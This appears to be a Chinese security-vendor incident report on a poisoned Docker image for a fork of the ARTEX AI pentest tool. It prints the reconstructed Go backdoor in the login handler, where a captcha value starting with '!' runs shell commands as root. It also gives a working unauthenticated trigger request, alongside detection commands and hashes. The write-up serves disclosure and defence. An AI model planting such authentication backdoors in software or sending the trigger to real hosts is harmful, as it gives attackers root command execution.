---
title: 【微信】ARTEX 流行 Fork 镜像供应链投毒事件分析
source: https://mp.weixin.qq.com/s/Mlq4JR0ol-b7xHAOZRiUMQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-05T16:02:59+08:00
trace_id: 0368e67e-5ece-4e59-a4e9-e5b1bceec83a
content_hash: 204b427c0786289f2266c262a3e5b6a178462490bc0cb2bd73b36d6f5db64227
status: synced
tags:
  - 微信
  - 供应链投毒
  - 恶意样本
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: ARTEX 流行 Fork 的 Docker 镜像被植入未认证 WebShell：源码干净但镜像引用遭篡改，按官方文档部署即中招，须核对镜像摘要排查。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 40f75244-d011-8195-b5ee-ff4be6138c50
ioc:
  cves: []
  cwes: []
  hashes:
    - 6d7ba9ced55bf353d3eca6cf95dc52ff
    - 84a3c38ad9605bd13fbfec84ecb2922b
    - a731d1c37e42ae9fa2f594eec39c3f39
    - ce85d8369ccc1a85423f1f75d2f3afaa2fab759e580da37a6891af2f7392745e
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> ARTEX 流行 Fork 的 Docker 镜像被植入未认证 WebShell：源码干净但镜像引用遭篡改，按官方文档部署即中招，须核对镜像摘要排查。
> 
> - **投毒手法：** 攻击者未改动任何源码，仅将 Fork 中 docker-compose.yml 的镜像引用改为自有 Docker Hub 账号 tomicdd/artex，镜像内 /app/artex 二进制被替换为含后门的版本，仅审计源码无法发现。
> - **后门触发：** 向 /api/auth/login 发送 JSON，captcha 字段首字符为感叹号（如 "!whoami"）时跳过用户名密码校验，剩余内容经 verifyCaptcha 以 sh -c 执行，stdout/stderr 合并回显且返回 HTTP 200，无需任何凭证。
> - **危害等级：** 镜像内进程以 root 运行且 8787 端口绑定宿主机所有网卡，等价于未认证 root 级 RCE；后门不主动外联、无硬编码 C2，检测依赖请求特征与二进制哈希。
> - **排查处置：** docker inspect 比对 RepoDigests 命中 sha256:ce85d836...7392745e 即确认投毒；立即 docker-compose down -v 并删镜像；凡运行过该镜像的宿主机按失陷处理，检查反弹 shell、authorized_keys、crontab/systemd 持久化及 ./data 卷中 jwt.key、数据库、凭据外泄；日志回溯检索 captcha 字段与 8787 端口外部访问。
> - **使用原则：** 安全工具不信任预构建镜像，从源码本地 docker build 并 diff 审计 auth.go 等认证文件，用 GoReSym/strings 做一致性与特征校验，管理端口禁绑 0.0.0.0；执行过 docker compose up 即视为潜在失陷，应重建主机并轮换凭据。

**安天垂直响应平台** *2026年11月5日 15:07*

结合 安天（ Antiy ） 与澜砥 N2.7威胁检测分析大模型辅助生成。

## 1\. 概述

2026年11月初，安天CERT监测到 GitHub 平台上的 ARTEX 项目流行 Fork（trhhubsd/ARTEX）及其安装指引指定的 Docker 镜像（tomicdd/artex）被植入后门。ARTEX 是一套由 Autumn-27 开发的多 Agent LLM 自主渗透测试系统，采用 Go 后端与 Next.js 前端。2026年10月，该工具被多个攻击活动滥用后，原作者下架了上游仓库并停止维护，此后多个 Fork 与镜像版本继续流通，trhhubsd/ARTEX 成为其中关注度较高的 Fork。

本报告分析三个样本： ARTEX-main_infected.zip 为该 Fork 的源码包；artex-image.tar 为源码包 中 docker-compose.yml 指定拉取的 Docker 镜像；artex.bin 为该镜像内的 /app/artex 可执行文件，即后门实体。三个样本的 MD5 与 SHA-256 见 2.1 节样本标签表。

安天工程师分析发现， 源码包中不含后门代码，但 docker-compose.yml 的镜像引用被篡改为攻击者 Docker Hub 账号 tomicdd 名下的镜像；该镜像内的 /app/artex 二进制被植入未认证 WebShell 后门。 后门位于 /api/auth/login 接口：请求 JSON 的 captcha 字段首字节为感叹号（!）时，处理函数跳过用户名与密码校验，将该字段剩余内容作为命令交给 verifyCaptcha 函数，以 sh -c 执行并将标准输出与标准错误合并回显，HTTP 状态码为 200。凡按该仓库 README 指引执行 docker compose up -d 的用户，均会拉取并运行该后门镜像；容器内进程以 root 身份运行，且 docker-compose.yml 将 8787 端口映射到宿主机所有网卡，构成未认证的远程命令执行。

安天工程师提示 ，本次投毒未改动任何源码文件，攻击者通过替换预构建镜像完成植入。仅审计源码无法发现该后门，必须核对镜像摘要与二进制哈希。

## 2\. 样本分析

## 2.1 样本标签

三个样本的基本属性见表 2-1 至表 2-3。

表 2-1 ARTEX-main_infected.zip 样本标签

|     |     |
| --- | --- |
| **字段** | **内容** |
| 病毒名称 | Trojan/Linux.WebShell\[Backdoor\] |
| 原始文件名 | ARTEX-main.zip |
| MD5 | A731D1C37E42AE9FA2F594EEC39C3F39 |
| 文件大小 | 7,535,955 字节（约 7.2 MB） |
| 文件格式 | ZIP 压缩包（GitHub 源码归档，含 690 个条目） |
| 解释语言或处理器架构 | Go 1.26 后端与 Next.js 前端源码 |

表 2-2 artex-image.tar 样本标签

|     |     |
| --- | --- |
| **字段** | **内容** |
| 病毒名称 | Trojan/Linux.WebShell\[Backdoor\] |
| 原始文件名 | artex-image.tar |
| MD5 | 84A3C38AD9605BD13FBFEC84ECB2922B |
| 文件大小 | 1,689,423,872 字节（约 1.57 GB） |
| 文件格式 | docker save 归档（OCI 镜像布局，RepoTags: artex-evidence:fixed） |
| 解释语言或处理器架构 | linux/amd64 |

表 2-3 artex.bin 样本标签

|     |     |
| --- | --- |
| **字段** | **内容** |
| 病毒名称 | Trojan/Linux.WebShell\[Backdoor\] |
| 原始文件名 | artex.bin（镜像内路径 /app/artex） |
| MD5 | 6D7BA9CED55BF353D3ECA6CF95DC52FF |
| 文件大小 | 51,210,988 字节（约 48.8 MB） |
| 文件格式 | ELF64 可执行文件（x86_64，未剥离符号与调试信息） |
| 解释语言或处理器架构 | Go 1.26.3 编译的 x86_64 二进制 |

## 2.2 载荷注入方式与代码结构

攻击者没有在源码中写入后门代码。对源码包全部 600 个文件检索 captcha、verifyCaptcha 标识，仅命中 guard/guard.go 中用于识别目标响应特征的拦截规则正则与 web/src/lib/mock/data.ts 的模拟数据，均属正常业务内容；server/auth.go 的登录处理函数只包含用户名与密码两个字段。

载荷注入通过 docker-compose.yml 的镜像引用完成。源码包中该文件第 18 行将 artex 服务的镜像指定为 tomicdd/artex（代码 2-1）。同目录 README.md 的安装指引同步写明“拉取 tomicdd/artex 镜像”。用户执行 install.sh 或 docker compose up -d 时，Docker 会从攻击者账号下拉取镜像并直接运行。

artex:

image: tomicdd/artex:${ARTEX_TAG:-latest}

代码 2-1 ARTEX-main_infected.zip 中 docker-compose.yml 的镜像引用（第 17—18 行）

artex-image.tar 为 docker save 导出的 OCI 布局镜像，共 11 个层。镜像配置显示其基于 python:3.12-slim-bookworm 构建，构建时间为 2026-10-08T20:33:52+01:00，入口为 /app/start.sh，默认参数为 -addr:8787 -proxy:8788，暴露 8787 与 8788 端口，数据卷为 /app/data。第 8 层通过 COPY dist/amd64/artex /app/artex 放入后门二进制，该层仅含 app 目录与 app/artex 一个文件。各层清单见表 2-4。

表 2-4 artex-image.tar 镜像层清单（按构建顺序）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/087ad09a26e3597f.png)

## 2.3 主要行为流程

本次事件的主要行为流程见图 2-1。攻击者先后完成账号准备、镜像投毒与仓库篡改；用户按仓库文档部署即被卷入；后门经登录接口的 captcha 字段触发，最终形成未认证 WebShell。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c09e7fbd43cc460d.png)

图 2-1 ARTEX 镜像供应链投毒主要行为流程

## 2.4 后门二进制分析

### 2.4.1 后门函数定位

安天工程师从镜像中提取 /app/artex 二进制样本，解析其.symtab 符号表，定位到登录处理函数 authLogin 与本次事件的核心函数 verifyCaptcha。符号表显示 authLogin 函数大小为 2103 字节，verifyCaptcha 函数大小为 152 字节，writeJSON 为响应写出函数。

#.symtab 符号（虚拟地址 / 符号名 / 大小，字节）

0xf92fe0 github.com/Autumn-27/artex/server.(\*Server).authLogin 2103

0xf93820 github.com/Autumn-27/artex/server.verifyCaptcha 152

0x1043840 github.com/Autumn-27/artex/server.writeJSON 499

代码 2-2 artex.bin 后门相关关键符号（地址与大小经.symtab 核对）

### 2.4.2 登录请求类型信息

通过反编译工具读取 authLogin 函数引用的结构体类型信息，确认该结构体在源码中定义了三个字段，其中 Captcha 字段为本次事件中被植入的额外字段。

name string "json:\\"username\\""; Password string "json:\\"password\\""; Captcha string "json:\\"captcha\\""

代码 2-3 artex.bin 类型信息中的登录请求结构体（含源码不存在的 Captcha 字段）

### 2.4.3 结构体字段偏移

结合反汇编指令验证上述字段偏移。在 x86-64 调用约定下，req.Captcha 的数据指针位于结构体偏移 32 字节处，对应反汇编中的 \[rdx + 0x20\] 寻址。

字段 Go 类型 json 标签 偏移（字节）: 数据指针 / 长度

Username string json:"username" 0 / 8

Password string json:"password" 16 / 24

Captcha string json:"captcha" 32 / 40 <- 被植入的额外字段

代码 2-4 登录请求结构体字段偏移（据类型信息与反汇编交叉验证）

### 2.4.4 authLogin 函数逻辑

安天工程师对 authLogin 函数进行反编译，还原其控制流。该函数在校验用户名与口令之前，先判断 Captcha 字段是否非空；若 Captcha 首字符为感叹号，则剥离首字符后调用 verifyCaptcha 函数并直接返回，不再执行原有认证流程。

func (s \*Server) authLogin(c \*gin.Context) {

var req struct {

Username string \`json:"username"\`

Password string \`json:"password"\`

Captcha string \`json:"captcha"\` // 被植入的额外字段

}

if err:= c.ShouldBindJSON(&req); err!= nil {

writeJSON(c, http.StatusBadRequest, gin.H{"error": "invalid request"})

return

}

if req.Captcha!= "" {

if req.Captcha\[0\] == '!' {

verifyCaptcha(c, req.Captcha\[1:\])

return

}

writeJSON(c, http.StatusBadRequest, gin.H{"error": "captcha error"})

return

}

// 原有认证流程：bcrypt 校验用户名与口令

user, err:= s.store.GetUserByUsername(req.Username)

if err!= nil || bcrypt.CompareHashAndPassword(\[\]byte(user.Password), \[\]byte(req.Password))!= nil {

writeJSON(c, http.StatusUnauthorized, gin.H{"error": "invalid credentials"})

return

}

writeJSON(c, http.StatusOK, gin.H{"token": issueToken(user)})

}

代码 2-5 authLogin 函数还原逻辑

### 2.4.5 verifyCaptcha 函数逻辑

该函数将输入字符串直接交给 exec.Command，以 sh -c 方式执行，并把标准输出与标准错误合并后写入响应。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/97576b4d1ca61273.png)

代码 2-6 verifyCaptcha 函数还原逻辑

在样本数据区定位到 exec.Command 的两个字符串常量参数，虚拟地址分别为 0x1366c08 与 0x1366c0a，内容为 sh 与 -c。

\# 样本数据区字符串常量（虚拟地址 / 字节 / 内容）

0x1366c08 73 68 b'sh'

0x1366c0a 2d 63 b'-c'

代码 2-7 exec.Command 字符串常量（地址经数据区字节核实）

安天工程师对 authLogin 函数后门分支的关键指令逐条反汇编核对，确认控制流与反编译结果一致。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/417b073d0844bfb3.png)

代码 2-8 authLogin 后门分支关键指令（地址经 capstone 反汇编核实）

### 2.4.6 触发条件与利用效果

触发条件只有一个：向 /api/auth/login 发送包含 captcha 字段的登录请求，且 captcha 字段以感叹号开头。该字段在用户名与口令校验之前被处理，因此攻击者无需任何有效凭证即可触发后门。

利用效果为以运行该二进制的用户权限执行任意 shell 命令。本次事件的镜像以 root 用户运行artex 进程，因此命令执行权限为 root。以下给出未认证任意命令执行的验证请求与响应。

验证请求：

POST /api/auth/login HTTP/1.1

Content-Type: application/json

{"username":"任意","password":"任意","captcha":"!whoami"}

验证响应：

HTTP/1.1 200 OK

{"captcha":"root\\n","error":""}

响应中的 captcha 字段返回了 whoami 命令的执行结果 root，error 字段为空，说明命令执行成功。该后门等价于一个未认证 WebShell，攻击者可进一步执行读取配置文件、反弹 shell、植入持久化后门等操作。

## 3 排查与处置建议

针对本次事件，安天 CERT建议用户按以下步骤开展排查与处置。凡通过 trhhubsd/ARTEX 仓库部署过 ARTEX 的用户，均应执行本章检查；已确认拉取或运行过 tomicdd/artex 镜像的主机，应按失陷主机处理。

## 3.1 镜像层快速自查

对本 地 Docker 环境列 举镜像并比对摘要。 若镜像的 RepoDigests 命中 sha256:ce85d8369ccc1a85423f1f75d2f3afaa2fab759e580da37a6891af2f7392745e，即确认使用了本次投毒镜像。操作命令如下：

docker images | grep -E 'tomicdd|artex'

docker inspect <image_id> --format='{{index.RepoDigests 0}}'

\# 比对 digest 是否命中 sha256:ce85d8369ccc1a85423f1f75d2f3afaa2fab759e580da37a6891af2f7392745e

## 3.2 运行态止损

确认命中后，立即停止并删除相关容器与镜像，操作命令如下：

docker-compose down -v

docker rmi -f tomicdd/artex:latest

docker image prune -a

## 3.3 宿主机失陷排查

投毒镜像内的主进程以 root 身份运行，后门可执行任意 shell 命令。凡部署过该镜像的宿主机均应按失陷处理，重点检查以下事项：

• 异常进程、反弹 shell 与对外连接；

• ~/.ssh/authorized_keys 是否被追加公钥；

• crontab、systemd timer、rc.local 等持久化位置是否被植入；

• 容器挂载的 ./data 卷中 jwt.key、SQLite 数据库、代理配置与目标资产凭据是否外泄。

## 3.4 日志回溯

通过网络层日志判断是否已被利用，重点检查以下事项：

• 反向代理与 WAF 日志中是否存在 captcha 字段、以! 为前缀的 POST /api/auth/login 请求；

• 8787 端口是否有外部 IP 的访问记录。

## 3.5 后续使用原则

对安全工具类镜像，建议遵循以下使用原则：

• 不信任任何预构建镜像，必须从源码本地 docker build；

• 构建前对 auth.go 等认证相关文件做 diff 审计；

• 镜像上线前执行源码与二进制的一致性校验，如以 GoReSym 提取符号表、以 strings 扫描特征；

• 管理端口禁止绑定 0.0.0.0。

处置红线：只要执行过 trhhubsd/ARTEX 仓库的 docker compose up，无论是否真正“登录使用”，容器启动即视为潜在失陷，应按主机重建与凭据轮换处理，不要只删除容器。

## 4\. 小结

本次事件是典型的镜像供应链投毒。攻击者未修改源码，而是注册 Docker Hub 账号、构建植入后门的镜像，再篡改流行 Fork 的 docker-compose.yml 将镜像引用指向自己账号。由于源码干净，仅做源码审计无法发现后门；预构建制品（Docker 镜像、二进制发布包）成为供应链攻击的高价值目标。 攻击者通过修改二进制文件植入后门 ， 通过 /api/auth/login 的 captcha 字段以感叹号开头时触发未认证 WebShell，以 root 权限执行任意 shell 命令并回显输出。凡按该仓库 README 部署的用户均受影响，容器 8787 端口暴露时攻击者可直接远程触发。后门不主动外联，无硬编码 C2 指标，检测需依赖请求特征（captcha 字段）与二进制哈希。

## 附录一：参考资料

\[1\] 来源：微软（Microsoft Security Research & Threat Intelligence）《AI-driven, large-scale nation-state campaign using ARTEX enables supply chain compromise》

链接：https://www.microsoft.com/en-us/security/blog/2026/10/21/storm-0940-uses-artex-agentic-ai-connectwise-supply-chain-compromise/

\[2\] 来源：网络安全情报攻防站（微信公众号）《谨慎使用！ARTEX 二开投毒：流行 Fork 的 Docker 镜像植入未认证 WebShell》

链接：https://mp.weixin.qq.com/s/1kXJCYK6EmswaPdEUYyeeQ

\[3\] 来源：linux.do 社区《知名渗透框架ARTEX仓库二开发生后门投毒》

链接：https://linux.do/t/topic/3120229

\[4\] 来源：linux.sb 社区《「ARTEX」二开后门投毒，下载过该fork版本的速删除自查》

链接：https://linux.sb/topic/29586

\[5\] 来源：GitHub（sharenjun/ARTEX-main）Pull Request #2 "Update docker-compose.yml"

链接：https://github.com/sharenjun/ARTEX-main/pull/2

\[6\] 来源：GitHub（kjmkjmkj/ARTEX）Pull Request #1 "Align release and Docker publication paths"

链接：https://github.com/kjmkjmkj/ARTEX/pull/1

\[7\] 来源：GitHub（darses/nuclei-templates）Issue #6 "Add ARTEX template"

链接：https://github.com/darses/nuclei-templates/issues/6

\[8\] 来源：FreeBuf《【打不过就加入？】"棒子"被ARTEX干懵了之后，选择了对其进行二开》

链接：https://www.freebuf.com/articles/508253.html

\[9\] 来源：FreeBuf《【今日说法】开发渗透/逆向工具是否违法？从 ARTEX 事件看开源工具的法律边界》

链接：https://www.freebuf.com/articles/505587.html

\[10\] 来源：云栈社区《ARTEX 渗透工具闭源停更，GitHub 备份仓库地址分享》

链接：https://yunpan.plus/t/31379-1-1

\[11\] 来源：BleepingComputer《Chinese hackers use ARTEX AI in automated attacks against 200 orgs》

链接：https://www.bleepingcomputer.com/news/security/chinese-hackers-use-artex-ai-in-automated-attacks-against-200-orgs/

\[12\] 来源：BleepingComputer《Hacker used ARTEX AI and Claude agents to target South Korean banks》

链接：https://www.bleepingcomputer.com/news/security/hacker-used-artex-ai-and-claude-agents-to-target-south-korean-banks/

\[13\] 来源：SecurityWeek《China APT Uses AI Pentest Tool Artex in ConnectWise Attacks》

链接：https://www.securityweek.com/china-apt-uses-ai-pentest-tool-artex-in-connectwise-attacks/

\[14\] 来源：Cybersecurity Dive《Agentic pen-testing tool employed in multiple espionage campaigns around the globe》

链接：https://www.cybersecuritydive.com/news/agentic-pen-testing-tool-espionage-campaigns/873427/

\[15\] 来源：赢政天下《Storm-0940用ARTEX框架3小时突破2250微软365租户》

链接：https://www.yingzheng.com/article/storm-0940-artex-connectwise-attack-microsoft-365

\[16\] 来源：掘金《【漏洞分析】ARTEX 未认证访问导致 RCE 漏洞深度剖析》

链接：https://juejin.cn/post/7697418750073864226
